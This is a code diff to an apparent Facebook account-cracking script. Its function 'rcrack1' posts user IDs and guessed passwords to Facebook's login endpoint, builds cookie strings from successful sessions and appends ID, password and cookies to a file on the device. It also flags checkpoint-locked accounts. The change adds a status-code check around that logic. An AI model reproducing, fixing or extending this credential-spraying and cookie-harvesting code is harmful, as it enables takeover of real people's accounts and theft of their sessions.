@@ -241,9 +241,11 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent':pro}
-            response = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
+            response = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb)
+            response_text = response.text
+            if response.status_code == 200:
+              log_cookies=session.cookies.get_dict().keys()
+              if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 bo = random.choice([RED,GREEN,BLUE,YELLOW,ORANGE,])
                 cid = coki[65:80]
@@ -251,7 +253,7 @@ def rcrack1(uid,pwx,tl):
                 open('/sdcard/LONDLY-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                 oks.append(uid)
                 break
-            elif 'checkpoint' in log_cookies:
+              elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
                 print(f"\x1b[38;5;196m[ARAFAT-CP💔] {uid}|{ps}")
